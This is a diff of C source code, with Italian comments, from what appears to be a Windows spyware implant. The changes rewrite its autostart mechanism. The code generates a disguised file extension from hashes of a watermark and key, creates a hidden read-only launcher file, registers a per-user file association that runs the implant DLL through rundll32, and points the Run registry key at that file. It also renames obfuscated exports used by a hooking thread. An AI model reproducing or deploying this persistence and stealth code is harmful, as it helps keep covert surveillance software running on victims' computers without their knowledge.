@@ -90,7 +90,7 @@ char H4DRIVER_NAME[MAX_RAND_NAME];
 char H4DRIVER_NAME_ALT[MAX_RAND_NAME];
 char H4_UPDATE_FILE[MAX_RAND_NAME];
 char REGISTRY_KEY_NAME[MAX_RAND_NAME];
-char OLD_REGISTRY_KEY_NAME[MAX_RAND_NAME];
+//char OLD_REGISTRY_KEY_NAME[MAX_RAND_NAME];
 char EXE_INSTALLER_NAME[MAX_RAND_NAME];
 
 char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
@@ -213,8 +213,8 @@ DWORD HM_HookingThreadSetup(DWORD * pD)
 	if (!FindModulePath(pHMHookingThreadData->cDLLHookName, sizeof(pHMHookingThreadData->cDLLHookName)))
 		return 1;
 
-	sprintf(pHMHookingThreadData->cInBundleHookName, "%s", "PFTBBP3");
-	sprintf(pHMHookingThreadData->cInBundleServiceName, "%s", "PFTBBP4");
+	sprintf(pHMHookingThreadData->cInBundleHookName, "%s", "PPPFTBBP03");
+	sprintf(pHMHookingThreadData->cInBundleServiceName, "%s", "PPPFTBBP04");
 	pHMHookingThreadData->lookup_bypass = TRUE;
 	return 0;
 }
@@ -1633,7 +1633,7 @@ BOOL HM_GuessNames()
 
 	// La chiave nel registry e' binary patchata
 	_snprintf_s(REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_REGISTRY_KEY);
-	_snprintf_s(OLD_REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_OLD_REGISTRY_KEY);
+	//_snprintf_s(OLD_REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_OLD_REGISTRY_KEY);
 	_snprintf_s(EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", H4_HOME_DIR);
 
 	// Genera i nomi della shared memory in base alla chiave per-cliente
@@ -1936,34 +1936,50 @@ BOOL HM_TimeStringToFileTime(const WCHAR *time_string, FILETIME *ftime)
 	return SystemTimeToFileTime(&stime, ftime);
 }
 
+#include "SkypeACL\HashUtil.h"
+#define EXT_LEN 4
+BOOL CreateFakeExtension(char *ext)
+{
+	DWORD i;
+	char md5_water[MD5_DIGEST_SIZE * 2 + 1];
+	char md5_encky[MD5_DIGEST_SIZE * 2 + 1];
+
+	if (!MD5_Array(md5_water, WATERMARK, 8))
+		return FALSE;
+	if (!MD5_Array(md5_encky, ENCRYPTION_KEY, 8))
+		return FALSE;
+	
+	for (i=0; i<EXT_LEN; i++) {
+		md5_water[i] += md5_encky[i];
+		ext[i] = 'a'+ (md5_water[i]%26);
+	}
+	ext[i] = 0;
+	return TRUE;
+}
+
 // Inserisce la chiave nel registry per l'avvio automatico
 void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 {
 	char key_value[DLLNAMELEN*3];
 	char dll_path[DLLNAMELEN];
+	char key_path[DLLNAMELEN];
+	char extension[12];
+	char *ptr;
+	HANDLE hfile;
 	HKEY hOpen;
-	HideDevice reg_device;
 
-#ifndef RUN_ONCE_KEY
-	// Cancella (se c'e' ancora) la vecchia chiave
-	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-		DWORD ktype;
-		if (FNC(RegQueryValueExA)(hOpen, OLD_REGISTRY_KEY_NAME, NULL, &ktype, NULL, NULL) == ERROR_SUCCESS) {
-			FNC(RegDeleteValueA) (hOpen, OLD_REGISTRY_KEY_NAME);
-		}
-		FNC(RegCloseKey)(hOpen);
-	}
+	if (!CreateFakeExtension(extension))
+		return;
 
-	// Se vuole forzarla, non interessa vedere se c'e' gia'
+	// Verifica, se richiesto, l'esistenza della chiave 
 	if (!force_insert) {
 		DWORD ktype;
 		char value[MAX_PATH];
 		DWORD len = sizeof(value);
 		ZeroMemory(value, len);
-		// XXX-NEWREG
-		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-			if (FNC(RegQueryValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, &ktype, (BYTE *)value, &len) == ERROR_SUCCESS) {
-				// La chiave c'e' gia'
+		sprintf(key_value, "Software\\Classes\\%s_auto_file\\shell\\open\\command", extension);
+		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, key_value, &hOpen) == ERROR_SUCCESS) {
+			if (FNC(RegQueryValueExA)(hOpen, NULL, NULL, &ktype, (BYTE *)value, &len) == ERROR_SUCCESS) {
 				if (strstr(value, dll_name)) {
 					FNC(RegCloseKey)(hOpen);
 					return;
@@ -1972,66 +1988,61 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 			FNC(RegCloseKey)(hOpen);
 		}
 	}
-#endif
-	// Path a rundll32.exe
-	memset(key_value, 0, sizeof(key_value));
-	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
-	strcat(key_value, "\\rundll32.exe ");
-	
+
+	// Crea il file per l'avvio se non esiste gia'
+	sprintf(key_value, "..\\%s.%s", extension, extension);
+	HM_CompletePath(key_value, dll_path);
+	hfile = CreateFile(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE) {
+		hfile = CreateFile(dll_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
+		if (hfile == INVALID_HANDLE_VALUE) {
+			CloseHandle(hfile);
+			return;
+		}
+		CloseHandle(hfile);
+		FNC(SetFileAttributesA)(dll_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_ARCHIVE);
+	} else 
+		CloseHandle(hfile);
+
+	// Scrive il comando da eseguire
+	sprintf(key_value, "%%systemroot%%\\system32\\rundll32.exe");
 	HM_CompletePath(dll_name, dll_path);
-
-	// Path alla DLL e nome funzione
-	strcat(key_value, "\""); // Per sicurezza...
-	strcat(key_value, "%systemdrive%\\");
+	strcat(key_value, "\""); 
+	strcat(key_value, "%systemroot%\\..\\");
 	strcat(key_value, dll_path+3);
-	strcat(key_value, "\""); // ...metto il path alla dll fra ""
-	strcat(key_value, ",PFTBBP8"); 
-
-	// Se riesce a scriverlo col driver esce...
-	if (reg_device.unhook_regwriteA(REGISTRY_KEY_NAME, key_value))
+	strcat(key_value, "\""); 
+	strcat(key_value, ",PPPFTBBP08"); 
+	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell\\open\\command", extension);
+	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, key_path, &hOpen) != ERROR_SUCCESS) 
 		return;
+	if (FNC(RegSetValueExA)(hOpen, NULL, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) != ERROR_SUCCESS) {
+		FNC(RegCloseKey)(hOpen);
+		return;
+	}
+	FNC(RegCloseKey)(hOpen);
 
-	//...altrimenti prova con le API
+	// Associa l'estensione
+	sprintf(key_value, "%s_auto_file", extension);
+	sprintf(key_path, "Software\\Classes\\.%s", extension);
+	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, key_path, &hOpen) != ERROR_SUCCESS) 
+		return;
+	if (FNC(RegSetValueExA)(hOpen, NULL, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) != ERROR_SUCCESS) {
+		FNC(RegCloseKey)(hOpen);
+		return;
+	}
+	FNC(RegCloseKey)(hOpen);
 
-#ifdef RUN_ONCE_KEY
-	// Tenta di aprire CURRENT_USER: RunOnce ( 'O' uppercase)
-	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) {
-		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS){
-			FNC(RegCloseKey)(hOpen);
-			return;
+	// scrive la chiave in Run
+	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS ||
+		FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {		
+		sprintf(key_value, H4_HOME_PATH);
+		if (ptr = strrchr(key_value, '\\')) { 
+			*ptr = 0;
+			sprintf(key_value, "%s\\%s.%s", key_value, extension, extension);
+			FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
 		}
 		FNC(RegCloseKey)(hOpen);
 	}
-
-	// Tenta di aprire CURRENT_USER: Runonce ( 'o' lowercase)
-	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce", &hOpen) == ERROR_SUCCESS) {
-		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS) {
-			FNC(RegCloseKey)(hOpen);
-			return;
-		}
-		FNC(RegCloseKey)(hOpen);
-	}
-
-	// Altrimenti la crea in CURRENT_USER: RunOnce ('O' uppercase)
-	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) {
-		FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);		
-		FNC(RegCloseKey)(hOpen);
-	}
-#else
-	// XXX-NEWREG
-	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS){
-			FNC(RegCloseKey)(hOpen);
-			return;
-		}
-		FNC(RegCloseKey)(hOpen);
-	}
-	// XXX-NEWREG
-	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-		FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);		
-		FNC(RegCloseKey)(hOpen);
-	}
-#endif
 }
 
 
@@ -2039,30 +2050,38 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 void HM_RemoveRegistryKey()
 {
 	HKEY hOpen;
-	HideDevice reg_device;
+	char key_path[DLLNAMELEN];
+	char dll_path[DLLNAMELEN];
+	char extension[12];
 
-	// Cerca di cancellare la chiave tramite il driver
-	if (reg_device.unhook_regdeleteA(REGISTRY_KEY_NAME))
+	// Cancella chiave in Run
+	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
+		FNC(RegCloseKey)(hOpen);
+	}
+
+	if (!CreateFakeExtension(extension))
 		return;
 
-#ifdef RUN_ONCE_KEY
-	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) 
-		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
+	// Cancella l'associazione
+	sprintf(key_path, "Software\\Classes\\.%s", extension);
+	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
 
-	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce", &hOpen) == ERROR_SUCCESS) 
-		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
-#else
-	// Cancella anche la vecchia chiave
-	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-		FNC(RegDeleteValueA) (hOpen, OLD_REGISTRY_KEY_NAME);
-		FNC(RegCloseKey)(hOpen);
-	}
-	// XXX-NEWREG
-	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
-		FNC(RegCloseKey)(hOpen);
-	}
-#endif
+	// Cancella il comando
+	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell\\open\\command", extension);
+	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
+	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell\\open", extension);
+	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
+	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell", extension);
+	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
+	sprintf(key_path, "Software\\Classes\\%s_auto_file", extension);
+	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
+
+	// Cancella il file
+	sprintf(key_path, "..\\%s.%s", extension, extension);
+	HM_CompletePath(key_path, dll_path);
+	FNC(SetFileAttributesA)(dll_path, FILE_ATTRIBUTE_NORMAL);
+	FNC(DeleteFileA)(dll_path);
 }
 
 // Ritorna il puntatore a dopo una stringa trovata in memoria
@@ -2704,14 +2723,14 @@ BOOL FindModulePath(char *path_buf, DWORD path_size)
 	if (strlen(path_buf) >= 3)
 		return TRUE;
 
-	// Cerca il modulo che esporta la funzione PFTBBP1 (cioe' se stesso)
+	// Cerca il modulo che esporta la funzione PPPFTBBP01 (cioe' se stesso)
 	if (!FNC(EnumProcessModules)(FNC(GetCurrentProcess)(), modules, sizeof(modules), &mod_size)) 
 		return FALSE;
 
 	mod_num = mod_size/sizeof(HMODULE);
 	for (i=0; i<mod_num; i++) {
 		// L'abbiamo trovato
-		if ((DWORD)GetProcAddress(modules[i], "PFTBBP1")) {
+		if ((DWORD)GetProcAddress(modules[i], "PPPFTBBP01")) {
 			hLib = modules[i];
 			break;
 		}
